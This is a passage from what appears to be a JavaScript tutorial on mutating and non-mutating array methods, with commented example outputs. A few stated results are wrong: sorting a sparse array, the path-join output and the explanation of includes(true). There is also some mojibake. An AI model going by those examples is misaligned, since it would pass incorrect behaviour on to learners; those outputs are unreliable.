arr.splice(1, 2, 'a', 'b'); // Replace elements at index 1-2 with 'a', 'b'
arr                         // [1, 'a', 'b', 4, 5]

// Negative start index
let arr = [1, 2, 3, 4, 5];
arr.splice(-2, 1);          // Start from -2 (third from end)
arr                         // [1, 2, 3, 5]

// Start beyond array length
let arr = [1, 2, 3];
arr.splice(10, 1);          // No effect (index beyond length)
arr                         // [1, 2, 3]

// deleteCount omitted
let arr = [1, 2, 3, 4, 5];
arr.splice(2);              // Remove from index 2 to end
arr                         // [1, 2]

// deleteCount 0
let arr = [1, 2, 3];
arr.splice(1, 0, 'a');      // Insert without removing
arr                         // [1, 'a', 2, 3]

// Returns removed elements
let arr = ['a', 'b', 'c', 'd'];
let removed = arr.splice(1, 2);
removed                     // ['b', 'c']
arr                         // ['a', 'd']

// Modifies original array
let arr = [1, 2, 3];
let result = arr.splice(1, 1, 99);
arr                         // [1, 99, 3] - MODIFIED
result                      // [2] - removed elements

// Sparse arrays with splice
let sparse = [1, , 3];
sparse.splice(1, 1, 2);
sparse                      // [1, 2, 3]

// Multiple changes
let arr = [1, 2, 3, 4, 5];
arr.splice(2, 0, 'a', 'b', 'c');  // Insert 3 elements at index 2
arr                         // [1, 2, 'a', 'b', 'c', 3, 4, 5]
```

**Return Value:**

```javascript
// Always returns array of removed elements
let arr = [1, 2, 3, 4];

// Remove 1 element
let removed = arr.splice(1, 1);
removed                     // [2]

// Remove multiple
let removed = arr.splice(1, 2);
removed                     // [3, 4]

// Remove 0 elements (insertion only)
let arr = [1, 2, 3];
let removed = arr.splice(1, 0, 'a', 'b');
removed                     // [] - nothing removed

// Remove beyond array length
let arr = [1, 2, 3];
let removed = arr.splice(1, 100);  // Only 2 elements after index 1
removed                     // [2, 3]
```

**Common Patterns:**

```javascript
// Remove specific element
function remove(arr, item) {
  let index = arr.indexOf(item);
  if (index > -1) {
    arr.splice(index, 1);
  }
  return arr;
}

remove([1, 2, 3, 2], 2);    // [1, 3, 2]

// Remove all instances
function removeAll(arr, item) {
  for (let i = arr.length - 1; i >= 0; i--) {
    if (arr[i] === item) {
      arr.splice(i, 1);
    }
  }
  return arr;
}

removeAll([1, 2, 3, 2, 1], 2);  // [1, 3, 1]

// Remove duplicates (destructive)
function removeDuplicates(arr) {
  for (let i = 0; i < arr.length; i++) {
    for (let j = i + 1; j < arr.length; j++) {
      if (arr[i] === arr[j]) {
        arr.splice(j, 1);
        j--;  // Adjust index since array shrunk
      }
    }
  }
  return arr;
}

removeDuplicates([1, 2, 2, 3, 3, 3]);  // [1, 2, 3]

// Insert at beginning
function insertAtStart(arr, ...items) {
  arr.splice(0, 0, ...items);
  return arr;
}

insertAtStart([2, 3], 0, 1);  // [0, 1, 2, 3]

// Insert at end (but push is better)
function insertAtEnd(arr, ...items) {
  arr.splice(arr.length, 0, ...items);
  return arr;
}

// Insert at specific index
function insertAt(arr, index, ...items) {
  arr.splice(index, 0, ...items);
  return arr;
}

insertAt([1, 4], 1, 2, 3);  // [1, 2, 3, 4]

// Replace all occurrences
function replaceAll(arr, oldValue, newValue) {
  for (let i = 0; i < arr.length; i++) {
    if (arr[i] === oldValue) {
      arr.splice(i, 1, newValue);
    }
  }
}

// Clear array
function clear(arr) {
  arr.splice(0);  // Remove all elements
}

// Copy array section
function extractSection(arr, start, end) {
  return arr.slice(start, end);  // Don't use splice for this!
}

// Move element
function moveElement(arr, fromIndex, toIndex) {
  let removed = arr.splice(fromIndex, 1);
  arr.splice(toIndex, 0, ...removed);
  return arr;
}

moveElement([1, 2, 3, 4], 0, 2);  // [2, 3, 1, 4]
```

**Performance Considerations:**

```javascript
// splice has O(n) complexity
// Shifts all elements after the splice point

let largeArray = Array.from({ length: 100000 }, (_, i) => i);

// Removing from beginning is slow
largeArray.splice(0, 1);    // O(n) - all elements shift left

// Removing from end is faster
largeArray.splice(largeArray.length - 1, 1);  // O(1)

// Many small removals are very inefficient
let arr = [1, 2, 3, 4, 5];
for (let i = 0; i < arr.length; i++) {
  arr.splice(i, 1);       // O(n) Ã— length times = O(nÂ²)
}

// Better: filter for removals
let arr = [1, 2, 3, 4, 5];
arr = arr.filter(x => x % 2 === 0);  // Keep only even

// Or reverse iteration
let arr = [1, 2, 3, 4, 5];
for (let i = arr.length - 1; i >= 0; i--) {
  if (someCondition(arr[i])) {
    arr.splice(i, 1);     // Only shifts later elements (fewer shifts)
  }
}
```

---

### 7.2.4 sort()

**sort()** sorts the elements of an array in place using a comparator function.

```javascript
// Default sort - converts to strings and sorts lexicographically
let arr = [3, 1, 4, 1, 5, 9, 2, 6];
arr.sort();
arr                         // [1, 1, 2, 3, 4, 5, 6, 9]

// String sort
let fruits = ['banana', 'apple', 'cherry'];
fruits.sort();
fruits                      // ['apple', 'banana', 'cherry']

// GOTCHA: Numbers sort as strings!
let nums = [30, 1, 4, 10];
nums.sort();
nums                        // [1, 10, 30, 4] - WRONG order!
// "10" < "30" < "4" lexicographically

// Numeric sort with comparator
let nums = [30, 1, 4, 10];
nums.sort((a, b) => a - b);
nums                        // [1, 4, 10, 30] - correct numeric order

// Descending sort
let nums = [3, 1, 4, 1, 5];
nums.sort((a, b) => b - a);
nums                        // [5, 4, 3, 1, 1]

// Object array sort
let people = [
  { name: 'Alice', age: 30 },
  { name: 'Bob', age: 25 },
  { name: 'Charlie', age: 35 }
];

// Sort by age
people.sort((a, b) => a.age - b.age);
// [{ Bob, 25 }, { Alice, 30 }, { Charlie, 35 }]

// Sort by name
people.sort((a, b) => a.name.localeCompare(b.name));
// [{ Alice, 30 }, { Bob, 25 }, { Charlie, 35 }]

// Case-insensitive string sort
let words = ['Apple', 'banana', 'Cherry'];
words.sort((a, b) => a.toLowerCase().localeCompare(b.toLowerCase()));
// ['Apple', 'banana', 'Cherry']

// Comparator function return values
// Negative: a comes before b
// Zero: a and b same order
// Positive: b comes before a

// Sort stability (ES2019+)
let data = [
  { key: 1, index: 0 },
  { key: 2, index: 1 },
  { key: 1, index: 2 }
];

// Sort by key (stable sort preserves original order for equal elements)
data.sort((a, b) => a.key - b.key);
// [
//   { key: 1, index: 0 },  // Kept original position
//   { key: 1, index: 2 },
//   { key: 2, index: 1 }
// ]
```

**Return Value and Side Effects:**

```javascript
// sort() returns the sorted array (same reference)
let arr = [3, 1, 2];
let result = arr.sort();
result                      // [1, 2, 3]
arr                         // [1, 2, 3] - same array, modified

result === arr              // true - same reference

// Multiple sorts - first sort wins
let arr = [3, 1, 2];
arr.sort().sort().sort();   // Multiple sort calls on same array

// Sparse arrays with sort
let sparse = [3, , 1];
sparse.sort();
sparse                      // [1, empty, 3] - hole moved

// Comparator this binding
let comparator = function(a, b) {
  return a - b;
};

let arr = [3, 1, 2];
arr.sort(comparator);       // Works, 'this' is undefined (or window)

// No ability to pass context to sort in ES5
// In ES6+, use arrow function to capture context
let context = { multiplier: -1 };
let arr = [3, 1, 2];
arr.sort((a, b) => (a - b) * context.multiplier);  // Descending
```

**Common Patterns:**

```javascript
// Numeric sort (most common issue)
let numbers = [10, 5, 40, 25, 1];
numbers.sort((a, b) => a - b);      // Ascending
numbers.sort((a, b) => b - a);      // Descending

// String sort with locale awareness
let names = ['Ã–', 'Z', 'A'];
names.sort();                        // Basic sort
names.sort((a, b) => a.localeCompare(b));  // Locale-aware

// Multi-field sort
let people = [
  { lastName: 'Smith', firstName: 'Alice' },
  { lastName: 'Jones', firstName: 'Bob' },
  { lastName: 'Smith', firstName: 'Charlie' }
];

people.sort((a, b) => {
  // Sort by lastName, then firstName
  if (a.lastName !== b.lastName) {
    return a.lastName.localeCompare(b.lastName);
  }
  return a.firstName.localeCompare(b.firstName);
});

// Custom sort object (natural ordering)
const customOrder = { 'high': 1, 'medium': 2, 'low': 3 };

let tasks = [
  { name: 'Task A', priority: 'low' },
  { name: 'Task B', priority: 'high' },
  { name: 'Task C', priority: 'medium' }
];

tasks.sort((a, b) => {
  return customOrder[a.priority] - customOrder[b.priority];
});

// Case-insensitive sort
let words = ['Apple', 'banana', 'Cherry'];
words.sort((a, b) => a.toLowerCase().localeCompare(b.toLowerCase()));

// Date sort
let dates = [
  new Date('2024-03-15'),
  new Date('2024-01-10'),
  new Date('2024-02-20')
];

dates.sort((a, b) => a.getTime() - b.getTime());

// Version sort (tricky!)
let versions = ['1.10.0', '1.2.0', '1.1.0'];
versions.sort();                    // ['1.1.0', '1.10.0', '1.2.0'] - WRONG

// Better version sort
function versionCompare(a, b) {
  let aParts = a.split('.').map(Number);
  let bParts = b.split('.').map(Number);
  
  for (let i = 0; i < Math.max(aParts.length, bParts.length); i++) {
    let aVal = aParts[i] || 0;
    let bVal = bParts[i] || 0;
    if (aVal !== bVal) {
      return aVal - bVal;
    }
  }
  return 0;
}

versions.sort(versionCompare);      // ['1.1.0', '1.2.0', '1.10.0']

// Shuffle array (Fisher-Yates)
function shuffle(arr) {
  for (let i = arr.length - 1; i > 0; i--) {
    let j = Math.floor(Math.random() * (i + 1));
    [arr[i], arr[j]] = [arr[j], arr[i]];
  }
  return arr;
}

// Random sort (not recommended - not truly random)
arr.sort(() => Math.random() - 0.5);  // Don't use this!
```

---

### 7.2.5 reverse()

**reverse()** reverses an array in place.

```javascript
// Basic reverse
let arr = [1, 2, 3, 4, 5];
arr.reverse();
arr                         // [5, 4, 3, 2, 1]

// String reversal (convert to array first)
let str = 'hello';
let reversed = str.split('').reverse().join('');
reversed                    // 'olleh'

// Or more modern
let reversed = [...str].reverse().join('');

// With arrays
let arr = ['a', 'b', 'c'];
arr.reverse();
arr                         // ['c', 'b', 'a']

// Returns modified array
let arr = [1, 2, 3];
let result = arr.reverse();
result                      // [3, 2, 1]
arr                         // [3, 2, 1] - same reference
result === arr              // true

// Sparse arrays - holes preserved
let sparse = [1, , 3];
sparse.reverse();
sparse                      // [3, empty, 1]

// Empty array
let empty = [];
empty.reverse();
empty                        // []

// Single element (no effect)
let single = [42];
single.reverse();
single                       // [42]

// Object properties reversed
let obj = { a: 1, b: 2, c: 3 };
let values = Object.values(obj);
values.reverse();
values                      // [3, 2, 1] - values are reversed, not keys
```

**Performance:**

```javascript
// reverse() is O(n) - linear time
// More efficient than manually reversing

// Efficient reversal
arr.reverse();              // O(n)

// Manual reversal (less efficient)
for (let i = 0; i < arr.length / 2; i++) {
  let temp = arr[i];
  arr[i] = arr[arr.length - 1 - i];
  arr[arr.length - 1 - i] = temp;
}  // Also O(n) but more code
```

**Common Patterns:**

```javascript
// Palindrome check
function isPalindrome(str) {
  let cleaned = str.toLowerCase().replace(/[^a-z0-9]/g, '');
  let reversed = cleaned.split('').reverse().join('');
  return cleaned === reversed;
}

isPalindrome('A man, a plan, a canal: Panama');  // true

// Reverse array without mutation
let arr = [1, 2, 3, 4, 5];
let reversed1 = [...arr].reverse();       // [5, 4, 3, 2, 1]
let reversed2 = arr.slice().reverse();    // [5, 4, 3, 2, 1]

// Original unchanged
arr                         // [1, 2, 3, 4, 5]

// Reverse and process
let data = [1, 2, 3, 4, 5];
let processed = data.slice().reverse().map(x => x * 2);
processed                   // [10, 8, 6, 4, 2]
data                        // [1, 2, 3, 4, 5] - unchanged

// Last N elements
function getLastN(arr, n) {
  return arr.slice(-n);     // Or arr.slice(arr.length - n)
}

getLastN([1, 2, 3, 4, 5], 2);  // [4, 5]

// But reversed
function getLastNReversed(arr, n) {
  return arr.slice(-n).reverse();
}

getLastNReversed([1, 2, 3, 4, 5], 2);  // [5, 4]

// Iterating in reverse
let arr = [1, 2, 3, 4, 5];

// Method 1: with reverse (modifies)
arr.reverse();
for (let item of arr) {
  console.log(item);
}

// Method 2: without modification
for (let i = arr.length - 1; i >= 0; i--) {
  console.log(arr[i]);
}

// Method 3: with slice (no modification)
[...arr].reverse().forEach(item => {
  console.log(item);
});
```

---

### 7.2.6 fill()

**fill()** fills all array elements from a start index to an end index with a static value.

```javascript
// Fill entire array
let arr = [1, 2, 3, 4, 5];
arr.fill(0);
arr                         // [0, 0, 0, 0, 0]

// Fill with start and end
let arr = [1, 2, 3, 4, 5];
arr.fill(9, 2, 4);          // Start at 2, end before 4
arr                         // [1, 2, 9, 9, 5]

// Just start index (to end)
let arr = [1, 2, 3, 4, 5];
arr.fill(0, 2);             // Start at 2, fill to end
arr                         // [1, 2, 0, 0, 0]

// Negative indices
let arr = [1, 2, 3, 4, 5];
arr.fill(9, -2);            // Start at -2 (from end)
arr                         // [1, 2, 3, 9, 9]

arr.fill(8, -3, -1);        // From -3 to before -1
arr                         // [1, 2, 8, 8, 9]

// Fill range
let arr = [1, 2, 3, 4, 5];
arr.fill(0, 1, 3);
arr                         // [1, 0, 0, 4, 5]

// Create array filled with values
let arr = new Array(5).fill(0);
arr                         // [0, 0, 0, 0, 0]

// Returns the modified array
let arr = [1, 2, 3];
let result = arr.fill(0);
result                      // [0, 0, 0]
arr === result              // true

// Fill sparse array
let sparse = new Array(5);
sparse.fill(1);
sparse                      // [1, 1, 1, 1, 1] - holes filled

// Fill with object reference (not copy!)
let arr = new Array(3).fill({});
arr[0].x = 1;
arr[0]                      // { x: 1 }
arr[1]                      // { x: 1 } - SAME object!
arr[2]                      // { x: 1 } - SAME object!

// All elements reference same object
arr[0] === arr[1]           // true
arr[1] === arr[2]           // true

// If you want separate objects
let arr = Array.from({ length: 3 }, () => ({}));
arr[0].x = 1;
arr[0]                      // { x: 1 }
arr[1]                      // {} - different object
arr[2]                      // {} - different object
```

**Common Patterns:**

```javascript
// Initialize array with value
let arr = new Array(10).fill(null);

// Initialize with objects (wrong way)
let arr = new Array(3).fill({});
arr[0].name = 'Alice';  // All objects affected!

// Initialize with objects (right way)
let arr = Array.from({ length: 3 }, () => ({}));
arr[0].name = 'Alice';  // Only first affected

// Initialize with calculated values
let arr = Array.from({ length: 5 }, (_, i) => i * 2);
arr                     // [0, 2, 4, 6, 8]

// Fill with default value
let arr = new Array(10).fill(undefined);

// Create 2D array
let matrix = Array.from({ length: 3 }, () => new Array(3).fill(0));
matrix[0][0] = 1;
// [[1, 0, 0], [0, 0, 0], [0, 0, 0]]

// Clear array content
let arr = [1, 2, 3, 4, 5];
arr.fill(undefined);
arr                     // [undefined, undefined, undefined, undefined, undefined]

// Or better: use length = 0
arr.length = 0;

// Fill boolean array
let flags = new Array(100).fill(false);
flags[0] = true;
flags                   // [true, false, false, ...]

// Fill with repeated pattern
let arr = new Array(12).fill(0);
arr.forEach((_, i) => arr[i] = (i % 3) + 1);
arr                     // [1, 2, 3, 1, 2, 3, 1, 2, 3, 1, 2, 3]
```

---

### 7.2.7 copyWithin()

**copyWithin()** copies part of an array to another location in the same array and returns it, without modifying its length.

```javascript
// Copy within same array
let arr = [1, 2, 3, 4, 5];
arr.copyWithin(0, 3);       // Copy from index 3 to beginning
arr                         // [4, 5, 3, 4, 5]

// copyWithin(target, start, end)
let arr = [1, 2, 3, 4, 5];
arr.copyWithin(0, 3, 5);    // Copy indices 3-4 to position 0
arr                         // [4, 5, 3, 4, 5]

// Copy to different position
let arr = [1, 2, 3, 4, 5];
arr.copyWithin(2, 0, 2);    // Copy [1, 2] to position 2
arr                         // [1, 2, 1, 2, 5]

// Negative indices
let arr = [1, 2, 3, 4, 5];
arr.copyWithin(-2, -3, -1); // Copy index 2 to positions -2, -1
arr                         // [1, 2, 3, 3, 4]

// Returns modified array
let arr = [1, 2, 3, 4, 5];
let result = arr.copyWithin(0, 3);
result                      // [4, 5, 3, 4, 5]
arr === result              // true

// Copy to same source (overlapping)
let arr = [1, 2, 3, 4, 5];
arr.copyWithin(1, 2, 4);    // Copy [3, 4] to position 1
arr                         // [1, 3, 4, 4, 5]

// With start index only
let arr = [1, 2, 3, 4, 5];
arr.copyWithin(0, 3);       // Copy from 3 to end
arr                         // [4, 5, 3, 4, 5]

// Copy entire array to beginning
let arr = ['a', 'b', 'c'];
arr.copyWithin(0, 0);       // No change
arr                         // ['a', 'b', 'c']

// Sparse arrays - holes copied as holes
let sparse = [1, , 3, , 5];
sparse.copyWithin(0, 2);
sparse                      // [3, empty, 5, empty, 5]
```

**When to Use:**

```javascript
// Most common: copy within array (usually with Typed Arrays)
let data = new Int32Array([1, 2, 3, 4, 5]);
data.copyWithin(2, 0, 2);   // [1, 2, 1, 2, 5]

// Rotate array (alternative to pop/shift)
let arr = [1, 2, 3, 4, 5];
arr.copyWithin(0, 1);       // [2, 3, 4, 5, 5] - not quite

// Better to use pop/shift for rotation:
arr = [1, 2, 3, 4, 5];
arr.push(arr.shift());      // [2, 3, 4, 5, 1]

// Array shifting (very inefficient!)
let arr = [1, 2, 3, 4, 5];
arr.copyWithin(0, 1);       // [2, 3, 4, 5, 5]
arr.length = 4;             // [2, 3, 4, 5]

// Move section of array
let arr = ['a', 'b', 'c', 'd', 'e'];
arr.copyWithin(1, 3);       // Move ['d', 'e'] to position 1
arr                         // ['a', 'd', 'e', 'd', 'e']

// Duplicate first half
let arr = [1, 2, 3, 4, 5];
arr.copyWithin(3, 0, 2);    // [1, 2, 3, 1, 2]

// Duplicate entire array if length doubled
let arr = [1, 2, 3];
arr.length = 6;
arr.copyWithin(3, 0, 3);    // [1, 2, 3, 1, 2, 3]

// Mostly used with Typed Arrays
let uint8 = new Uint8Array([1, 2, 3, 4, 5]);
uint8.copyWithin(2, 0, 2);
uint8                       // [1, 2, 1, 2, 5]
```

**Performance Note:**

copyWithin() is rarely used in JavaScript arrays. It's more useful with Typed Arrays for low-level buffer manipulation.

**Best Practices:**

```javascript
// âœ“ Use copyWithin with Typed Arrays (performance-critical code)
let buffer = new Int32Array([1, 2, 3, 4, 5]);
buffer.copyWithin(2, 0);

// âœ— Avoid copyWithin with regular arrays (not idiomatic)
let arr = [1, 2, 3, 4, 5];
arr.copyWithin(0, 3);       // Confusing, rarely seen

// âœ“ Use clearer methods for regular arrays
let arr = [1, 2, 3, 4, 5];
arr = [...arr.slice(3), ...arr];  // More readable
```
## 7.3 Array Methods (Non-mutating)

**Non-mutating methods** return a new array or value without modifying the original array. This is a fundamental principle of functional programming and makes code more predictable.

---

### 7.3.1 concat()

**concat()** returns a new array by merging multiple arrays or values with the original array.

```javascript
// Basic concatenation
let arr1 = [1, 2];
let arr2 = [3, 4];
let result = arr1.concat(arr2);
result                      // [1, 2, 3, 4]
arr1                        // [1, 2] - unchanged
arr2                        // [3, 4] - unchanged

// Multiple arrays
let result = [1, 2].concat([3, 4], [5, 6]);
result                      // [1, 2, 3, 4, 5, 6]

// Mix arrays and values
let result = [1, 2].concat(3, 4, [5, 6]);
result                      // [1, 2, 3, 4, 5, 6]

// No arguments
let arr = [1, 2, 3];
let copy = arr.concat();    // [1, 2, 3] - shallow copy

// Flattening one level
let nested = [[1, 2], [3, 4]];
let flat = [].concat(...nested);  // [1, 2, 3, 4]

// Sparse arrays preserved (as holes)
let sparse = [1, , 3];
let result = sparse.concat([4, 5]);
result                      // [1, empty, 3, 4, 5]

// Strings are NOT spread
let result = [1, 2].concat('abc');
result                      // [1, 2, 'abc'] - not [1, 2, 'a', 'b', 'c']

// Objects with array-like structure
let arrayLike = { 0: 'a', 1: 'b', length: 2 };
let result = [].concat(arrayLike);
result                      // [{ 0: 'a', 1: 'b', length: 2 }] - not spread!

// Objects with [Symbol.isConcatSpreadable]
let obj = {
  [Symbol.isConcatSpreadable]: true,
  0: 'a',
  1: 'b',
  length: 2
};
let result = [].concat(obj);
result                      // ['a', 'b'] - spread because of symbol

// Shallow copy behavior
let arr = [{ name: 'Alice' }, { name: 'Bob' }];
let copy = arr.concat();
copy[0].name = 'Charlie';
arr[0].name                 // 'Charlie' - objects still referenced!

// Check if something concatenates
let arr1 = [1, 2];
arr1 = arr1.concat(3);      // [1, 2, 3]
arr1 = arr1.concat([4, 5]); // [1, 2, 3, 4, 5]
```

**Spread vs concat():**

```javascript
// Spread operator (modern, preferred)
let result = [...arr1, ...arr2];

// concat (older)
let result = arr1.concat(arr2);

// concat can mix values and arrays
let result = [1, 2].concat(3, [4, 5], 6);  // [1, 2, 3, 4, 5, 6]

// With spread, must group
let result = [1, 2, 3, ...[4, 5], 6];      // [1, 2, 3, 4, 5, 6]

// Functional composition
let joinArrays = (a, b) => a.concat(b);
let arr1 = [1, 2];
let arr2 = [3, 4];
let result = [arr1, arr2].reduce(joinArrays);  // [1, 2, 3, 4]

// Or with spread
let result = [arr1, arr2].reduce((a, b) => [...a, ...b]);
```

---

### 7.3.2 slice()

**slice()** returns a shallow copy of a portion of an array as a new array object.

```javascript
// Extract portion
let arr = [1, 2, 3, 4, 5];
let slice1 = arr.slice(1, 3);   // From 1 to before 3
slice1                      // [2, 3]

// From start
let slice2 = arr.slice(2);      // From 2 to end
slice2                      // [3, 4, 5]

// From beginning
let slice3 = arr.slice(0);      // Copy entire array
slice3                      // [1, 2, 3, 4, 5]

// Negative indices
let arr = [1, 2, 3, 4, 5];
let slice1 = arr.slice(-2);     // Last 2 elements
slice1                      // [4, 5]

let slice2 = arr.slice(-3, -1); // From -3 to before -1
slice2                      // [3, 4]

// Slice from end
let slice3 = arr.slice(-1);
slice3                      // [5]

// No arguments
let arr = [1, 2, 3];
let copy = arr.slice();     // [1, 2, 3] - shallow copy

// Start beyond length
let arr = [1, 2, 3];
let slice = arr.slice(10);
slice                       // [] - empty

// Negative start greater than length
let arr = [1, 2, 3];
let slice = arr.slice(-10);
slice                       // [1, 2, 3] - entire array

// Sparse arrays
let sparse = [1, , 3, , 5];
let slice = sparse.slice(1, 4);
slice                       // [empty, 3, empty] - holes preserved

// Shallow copy
let arr = [{ id: 1 }, { id: 2 }];
let copy = arr.slice();
copy[0].id = 99;
arr[0].id                   // 99 - objects shared!

// Convert array-like to array (alternative to Array.from)
function myFunc() {
  let args = Array.prototype.slice.call(arguments);
  return args;
}

myFunc('a', 'b', 'c');      // ['a', 'b', 'c']

// With strings
let str = 'hello';
let arr = str.slice(1, 4);  // 'ell'
// slice works on strings too, but returns string not array

// Get last N elements
function getLastN(arr, n) {
  return arr.slice(-n);
}

getLastN([1, 2, 3, 4, 5], 2);  // [4, 5]

// Get all but last N
function getAllButLastN(arr, n) {
  return arr.slice(0, -n);
}

getAllButLastN([1, 2, 3, 4, 5], 2);  // [1, 2, 3]

// Removing elements without mutation
let arr = [1, 2, 3, 4, 5];
let without3 = arr.slice(0, 2).concat(arr.slice(3));
without3                    // [1, 2, 4, 5]

// Or with spread
let without3 = [...arr.slice(0, 2), ...arr.slice(3)];

// Clone array at point in time
let original = [1, 2, 3];
let snapshot = original.slice();
original.push(4);
snapshot                    // [1, 2, 3] - unchanged
```

---

### 7.3.3 join()

**join()** joins all elements of an array into a single string.

```javascript
// Default separator
let arr = ['a', 'b', 'c'];
let str = arr.join();       // "a,b,c" - default comma

// Custom separator
let arr = ['a', 'b', 'c'];
let str = arr.join('-');    // "a-b-c"

let str = arr.join('');     // "abc"
let str = arr.join(' ');    // "a b c"

// Single element
let arr = ['hello'];
let str = arr.join();       // "hello"

// Empty array
let arr = [];
let str = arr.join();       // ""

// With numbers (converted to strings)
let arr = [1, 2, 3];
let str = arr.join(':');    // "1:2:3"

// With nullish values
let arr = [1, null, 3, undefined, 5];
let str = arr.join('-');    // "1--3--5" - nullish become empty strings

// Sparse arrays (holes become empty string)
let sparse = [1, , 3];
let str = sparse.join('-');
str                         // "1--3" - hole is empty string

// No extra spaces added
let arr = ['a', 'b', 'c'];
let str = arr.join(' , ');  // "a , b , c"

// Template strings (modern alternative)
let arr = [1, 2, 3];
let str = `${arr[0]}-${arr[1]}-${arr[2]}`;  // "1-2-3"
// But not as readable for variable arrays

// CSV format
let records = [
  { name: 'Alice', age: 30 },
  { name: 'Bob', age: 25 }
];

let csv = [
  'name,age',
  ...records.map(r => `${r.name},${r.age}`)
].join('\n');
// name,age\nAlice,30\nBob,25

// Nested arrays (calls toString on inner arrays)
let nested = [[1, 2], [3, 4]];
let str = nested.join('-');
str                         // "1,2-3,4" - inner arrays joined with comma

// Reversing characters
function reverseString(str) {
  return str.split('').reverse().join('');
}

reverseString('hello');     // 'olleh'

// Palindrome check
function isPalindrome(str) {
  let clean = str.toLowerCase().replace(/[^a-z0-9]/g, '');
  let reversed = clean.split('').reverse().join('');
  return clean === reversed;
}

isPalindrome('racecar');    // true

// HTML generation
let items = ['Apple', 'Banana', 'Cherry'];
let html = '<li>' + items.join('</li><li>') + '</li>';
// <li>Apple</li><li>Banana</li><li>Cherry</li>

// Or better with template
let html = items.map(item => `<li>${item}</li>`).join('');

// Path joining (but use path.join in Node.js)
let parts = ['home', 'user', 'documents'];
let path = parts.join('/');
// '/home/user/documents'

// Custom joining function
function customJoin(arr, separator, transform) {
  return arr.map(x => transform ? transform(x) : x).join(separator);
}

customJoin([1, 2, 3], '-', x => x * 2);  // "2-4-6"
```

---

### 7.3.4 indexOf() and lastIndexOf()

**indexOf()** returns the first index at which an element can be found, or -1 if not present.

**lastIndexOf()** returns the last index of an element.

```javascript
// Find first index
let arr = ['a', 'b', 'c', 'b', 'd'];
let index = arr.indexOf('b');
index                       // 1

// Not found
let index = arr.indexOf('z');
index                       // -1

// Start from index
let arr = [1, 2, 3, 2, 1];
let index = arr.indexOf(2, 2);  // Start searching from index 2
index                       // 3

// Find last index
let arr = ['a', 'b', 'c', 'b', 'd'];
let index = arr.lastIndexOf('b');
index                       // 3

// Last occurrence with start index (search backwards)
let arr = [1, 2, 3, 2, 1];
let index = arr.lastIndexOf(2, 2);  // Search backwards from index 2
index                       // 1

// Strict equality (===)
let arr = [1, '1', 2];
arr.indexOf(1);             // 0
arr.indexOf('1');           // 1
arr.indexOf(true);          // -1 (true != 1 with strict equality)

// With objects (reference equality)
let obj1 = { name: 'Alice' };
let obj2 = { name: 'Alice' };
let arr = [obj1, obj2];
arr.indexOf(obj1);          // 0 - found
arr.indexOf(obj2);          // -1 - not found (different object)
arr.indexOf({ name: 'Alice' });  // -1 - new object

// With NaN (special case!)
let arr = [1, 2, NaN, 4];
arr.indexOf(NaN);           // -1 (NaN !== NaN)
arr.lastIndexOf(NaN);       // -1 (NaN !== NaN)

// Sparse arrays skip holes
let sparse = [1, , 3, , 5];
sparse.indexOf(undefined);  // -1 (holes are not undefined values)

// Conditional search - need filter
let arr = [1, 2, 3, 4, 5];
// Get all indices where element > 2
let indices = arr
  .map((x, i) => x > 2 ? i : -1)
  .filter(i => i >= 0);
indices                     // [2, 3, 4]

// Check if element exists
let arr = ['apple', 'banana', 'cherry'];
if (arr.indexOf('banana') !== -1) {
  console.log('Found');
}

// Or use includes (ES6+)
if (arr.includes('banana')) {
  console.log('Found');
}

// Find index of minimum value
let arr = [3, 1, 4, 1, 5];
let minValue = Math.min(...arr);
let minIndex = arr.indexOf(minValue);
minIndex                    // 1

// Find first even number
let arr = [1, 3, 4, 5, 6];
let firstEvenIndex = arr.findIndex(x => x % 2 === 0);
firstEvenIndex              // 2 (not indexOf)

// Get all indices of value
function getIndices(arr, value) {
  let indices = [];
  let index = arr.indexOf(value);
  while (index !== -1) {
    indices.push(index);
    index = arr.indexOf(value, index + 1);
  }
  return indices;
}

getIndices([1, 2, 3, 2, 1], 2);  // [1, 3]

// Or with map/filter
function getIndices(arr, value) {
  return arr
    .map((x, i) => x === value ? i : -1)
    .filter(i => i !== -1);
}

// Remove all occurrences
function removeAll(arr, value) {
  let index;
  while ((index = arr.indexOf(value)) !== -1) {
    arr.splice(index, 1);
  }
  return arr;
}

removeAll([1, 2, 3, 2, 1], 2);  // [1, 3, 1]

// Or non-mutating
function removeAll(arr, value) {
  return arr.filter(x => x !== value);
}
```

---

### 7.3.5 includes()

**includes()** determines whether an array includes a certain element, returning true or false.

```javascript
// Basic check
let arr = [1, 2, 3, 4, 5];
arr.includes(3);            // true
arr.includes(6);            // false

// With strings
let fruits = ['apple', 'banana', 'cherry'];
fruits.includes('banana');  // true

// Start from index
let arr = [1, 2, 3, 2, 1];
arr.includes(2, 3);         // true (search from index 3)
arr.includes(1, 1);         // true (search from index 1)
arr.includes(3, 3);         // false (3 is not at or after index 3)

// Negative start index
let arr = [1, 2, 3, 4, 5];
arr.includes(4, -2);        // true (search last 2 elements)
arr.includes(1, -2);        // false (1 is not in last 2 elements)

// With NaN (unlike indexOf)
let arr = [1, 2, NaN, 4];
arr.includes(NaN);          // true (NaN === NaN for includes!)

// Note the difference from indexOf
arr.indexOf(NaN);           // -1
arr.includes(NaN);          // true

// Strict equality (===)
let arr = [1, '1', true];
arr.includes(1);            // true
arr.includes('1');          // true
arr.includes(true);         // true (but only because of coercion)
arr.includes(1, 0);         // true (exact match)

// With objects
let obj = { id: 1 };
let arr = [obj];
arr.includes(obj);          // true (same reference)
arr.includes({ id: 1 });    // false (different object)

// Sparse arrays skip holes
let sparse = [1, , 3];
sparse.includes(undefined); // false (holes are not values)

// Checking multiple conditions
let status = 'active';
if (['active', 'pending', 'completed'].includes(status)) {
  console.log('Valid status');
}

// Validating options
const validOptions = ['small', 'medium', 'large'];
function getSize(size) {
  if (validOptions.includes(size)) {
    return size;
  }
  return 'medium';  // default
}

// Checking environment
const isDev = ['development', 'testing'].includes(process.env.NODE_ENV);

// Case-insensitive check
let arr = ['Apple', 'Banana', 'Cherry'];
let search = 'apple';
let found = arr.some(x => x.toLowerCase() === search.toLowerCase());
found                       // true

// Or with includes on lowercase
let lowerArr = arr.map(x => x.toLowerCase());
lowerArr.includes(search.toLowerCase());  // true

// Check if any element matches condition
let arr = [1, 2, 3, 4, 5];
// Check if any element is greater than 3
let hasGreaterThan3 = arr.some(x => x > 3);  // true (better than includes)

// Or with find
let hasGreaterThan3 = arr.find(x => x > 3) !== undefined;  // true

// Tag checking
let tags = ['javascript', 'typescript', 'nodejs'];
function hasTag(article, tag) {
  return article.tags.includes(tag);
}

// Permission checking
let userPermissions = ['read', 'write', 'admin'];
function canDelete(user) {
